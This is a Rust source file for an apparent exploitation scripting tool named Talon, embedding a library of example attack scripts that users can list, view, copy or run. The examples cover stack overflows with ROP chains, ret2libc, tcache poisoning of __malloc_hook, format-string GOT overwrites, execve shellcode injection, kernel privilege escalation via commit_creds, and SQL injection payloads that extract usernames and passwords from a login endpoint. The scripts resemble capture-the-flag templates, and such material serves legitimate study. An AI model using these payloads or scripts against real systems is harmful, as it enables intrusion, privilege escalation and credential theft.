use std::fs;
use std::collections::HashMap;

pub struct ExampleLibrary {
    examples: HashMap<String, Example>,
}

struct Example {
    name: String,
    category: String,
    description: String,
    code: String,
}

impl ExampleLibrary {
    pub fn new() -> Self {
        let mut lib = ExampleLibrary {
            examples: HashMap::new(),
        };
        lib.load_builtin_examples();
        lib
    }
    
    fn load_builtin_examples(&mut self) {
        self.add_example(
            "buffer-overflow",
            "Binary Exploitation",
            "Classic stack buffer overflow with ROP chain",
            r#"// Buffer overflow example
analyze binary "./vuln"

// Find offset
let offset = 72

// Build ROP chain
let pop_rdi = 0x401234
let bin_sh = 0x402000
let system_plt = 0x401040

let rop_chain = [
    pop_rdi,
    bin_sh,
    system_plt
]

let payload = "A" * offset + rop_chain | bytes

connect to "target.com" on port 1337
send payload
let flag = recv 1024
print "Flag: " + flag
"#
        );
        
        self.add_example(
            "heap-tcache",
            "Heap Exploitation",
            "Tcache poisoning to overwrite __malloc_hook",
            r#"// Tcache poisoning example (glibc 2.27+)
heap_exploit "./heap_challenge"
    technique: tcache_poisoning
    target: __malloc_hook
    overwrite_with: system
    glibc_version: "2.31"
end

// Leak libc
let libc_leak = recv 8 | u64
let libc_base = libc_leak - 0x1ec980

// Calculate addresses
let malloc_hook = libc_base + 0x1eee30
let one_gadget = libc_base + 0xe3b01

// Allocate and free to populate tcache
malloc 0x80
malloc 0x80
let victim = malloc 0x80

free victim

// Overwrite fd pointer
let payload = p64(malloc_hook)
send payload

// Allocate twice to get malloc_hook
malloc 0x80
malloc 0x80

// Overwrite malloc_hook with one_gadget
send p64(one_gadget)

// Trigger malloc to get shell
malloc 0x10
let shell = recv 1024
print "Shell: " + shell
"#
        );
        
        self.add_example(
            "format-string",
            "Format String",
            "Format string arbitrary write to GOT",
            r#"// Format string exploitation
analyze binary "./format_vuln"

// Leak canary and libc
let leak_payload = "%11$p.%13$p.%15$p"
send leak_payload
let response = recv 1024

// Parse leaks
let parts = response | split "."
let canary = parts[0] | u64
let libc_leak = parts[1] | u64
let libc_base = libc_leak - 0x270b3

// Calculate addresses
let got_printf = 0x601020
let system = libc_base + 0x50d60

// Build format string to overwrite GOT
let low_bytes = system & 0xffff
let high_bytes = (system >> 16) & 0xffff

let payload = p64(got_printf)
payload = payload + p64(got_printf + 2)
payload = payload + "%" + low_bytes + "c%10$hn"
payload = payload + "%" + (high_bytes - low_bytes) + "c%11$hn"

send payload
send "/bin/sh"

let shell = recv 1024
print "Shell: " + shell
"#
        );
        
        self.add_example(
            "ret2libc",
            "ROP",
            "Return-to-libc attack bypassing NX",
            r#"// ret2libc exploitation
analyze binary "./ret2libc_vuln"

// Leak libc address
let puts_plt = 0x401030
let puts_got = 0x601018
let pop_rdi = 0x401243
let main_addr = 0x401136

// Stage 1: Leak libc
let stage1 = "A" * 72
stage1 = stage1 + [pop_rdi, puts_got, puts_plt, main_addr] | bytes

send stage1
let leak = recv 8 | u64
let libc_base = leak - 0x875a0

// Calculate system and /bin/sh
let system = libc_base + 0x50d60
let bin_sh = libc_base + 0x1d8698

// Stage 2: Call system("/bin/sh")
let stage2 = "A" * 72
stage2 = stage2 + [pop_rdi, bin_sh, system] | bytes

send stage2
let shell = recv 1024
print "Got shell: " + shell
"#
        );
        
        self.add_example(
            "simple-rop",
            "ROP",
            "Simple ROP chain example",
            r#"// Simple ROP chain
let offset = 264

// Gadgets
let pop_rdi = 0x401234
let pop_rsi_r15 = 0x401236
let ret = 0x40123a

// Addresses
let system_plt = 0x401040
let bin_sh_addr = 0x402004

// Build ROP chain
let rop_chain = [
    ret,            // Stack alignment
    pop_rdi,
    bin_sh_addr,    // rdi = "/bin/sh"
    system_plt      // Call system()
]

let payload = "A" * offset + rop_chain | bytes

connect to "localhost" on port 9999
send payload
interactive
"#
        );
        
        self.add_example(
            "web-sqli",
            "Web Exploitation",
            "SQL injection attack",
            r#"// SQL Injection example
let url = "http://target.com/login"

// Test for SQLi
let payloads = [
    "' OR '1'='1' --",
    "admin' --",
    "' UNION SELECT NULL,NULL,NULL--"
]

for payload in payloads
    let response = http_post url {
        username: payload,
        password: "anything"
    }
    
    if response | contains "Welcome"
        print "SQLi successful with: " + payload
        break
    end
end

// Extract data
let union_payload = "' UNION SELECT username,password,NULL FROM users--"
let data = http_post url {
    username: union_payload,
    password: "x"
}

print "Extracted data: " + data
"#
        );
        
        self.add_example(
            "shellcode-basic",
            "Shellcode",
            "Basic execve shellcode injection",
            r#"// Shellcode injection
// execve("/bin/sh", NULL, NULL)
let shellcode = [
    0x48, 0x31, 0xf6,                    // xor rsi, rsi
    0x56,                                // push rsi
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,  // movabs rdi, "/bin//sh"
    0x2f, 0x2f, 0x73, 0x68,
    0x57,                                // push rdi
    0x54,                                // push rsp
    0x5f,                                // pop rdi
    0x6a, 0x3b,                          // push 59
    0x58,                                // pop rax
    0x99,                                // cdq
    0x0f, 0x05                           // syscall
]

let nop_sled = [0x90] * 100
let offset = 200

let payload = nop_sled + shellcode + "A" * (offset - 100 - 21) + p64(stack_addr)

connect to "target.com" on port 4444
send payload
interactive
"#
        );
        
        self.add_example(
            "kernel-exploit",
            "Kernel Exploitation",
            "Linux kernel privilege escalation",
            r#"// Kernel exploitation
analyze kernel_module "./vuln.ko"

// Prepare kernel exploit
let commit_creds = 0xffffffff810a1420
let prepare_kernel_cred = 0xffffffff810a1810

// Build kernel ROP chain
let pop_rdi = 0xffffffff81001234
let pop_rcx = 0xffffffff81001236
let mov_rdi_rax_call_rcx = 0xffffffff81001240

let rop_chain = [
    pop_rdi,
    0,                          // NULL argument
    prepare_kernel_cred,
    pop_rcx,
    commit_creds,
    mov_rdi_rax_call_rcx,       // commit_creds(prepare_kernel_cred(0))
    swapgs_ret,
    0,                          // iretq frame
    user_shell_addr,
    user_cs,
    user_rflags,
    user_sp,
    user_ss
]

let payload = "A" * 64 + rop_chain | bytes
kernel_write "/dev/vulnerable", payload

// Return to userspace with root shell
print "Root shell obtained"
"#
        );
    }
    
    fn add_example(&mut self, name: &str, category: &str, description: &str, code: &str) {
        self.examples.insert(
            name.to_string(),
            Example {
                name: name.to_string(),
                category: category.to_string(),
                description: description.to_string(),
                code: code.to_string(),
            }
        );
    }
    
    pub fn list(&self) {
        println!("\n╔═══════════════════════════════════════════════════════════════════════════╗");
        println!("║                        TALON EXAMPLE LIBRARY                              ║");
        println!("╚═══════════════════════════════════════════════════════════════════════════╝\n");
        
        let mut by_category: HashMap<String, Vec<&Example>> = HashMap::new();
        for example in self.examples.values() {
            by_category.entry(example.category.clone())
                .or_insert_with(Vec::new)
                .push(example);
        }
        
        for (category, examples) in by_category.iter() {
            println!("{}:", category);
            for example in examples {
                println!("  {} - {}", example.name, example.description);
            }
            println!();
        }
        
        println!("Usage:");
        println!("  talon examples show <name>    - View example code");
        println!("  talon examples run <name>     - Execute example interactively");
        println!("  talon examples copy <name>    - Copy to current directory");
        println!();
    }
    
    pub fn show(&self, name: &str) {
        if let Some(example) = self.examples.get(name) {
            println!("\n╔═══════════════════════════════════════════════════════════════════════════╗");
            println!("║ Example: {} - {}", example.name, example.category);
            println!("╚═══════════════════════════════════════════════════════════════════════════╝");
            println!("\n{}", example.description);
            println!("\n{}", "─".repeat(80));
            println!("{}", example.code);
            println!("{}\n", "─".repeat(80));
        } else {
            println!("Example '{}' not found. Use 'talon examples list' to see available examples.", name);
        }
    }
    
    pub fn run(&self, name: &str) -> Result<(), String> {
        if let Some(example) = self.examples.get(name) {
            println!("Running example: {}", example.name);
            println!("{}", "─".repeat(80));
            
            let cmds = crate::parser::parse_script(&example.code)
                .map_err(|e| format!("Parse error: {}", e))?;
            
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(crate::interpreter::interpret(&cmds))
                .map_err(|e| format!("Execution error: {}", e))?;
            
            Ok(())
        } else {
            Err(format!("Example '{}' not found", name))
        }
    }
    
    pub fn copy(&self, name: &str, dest_name: Option<&str>) -> Result<(), String> {
        if let Some(example) = self.examples.get(name) {
            let default_name = format!("{}.tal", example.name);
            let filename = dest_name.unwrap_or(&default_name);
            
            fs::write(filename, &example.code)
                .map_err(|e| format!("Failed to write file: {}", e))?;
            
            println!("Example copied to: {}", filename);
            Ok(())
        } else {
            Err(format!("Example '{}' not found", name))
        }
    }
}
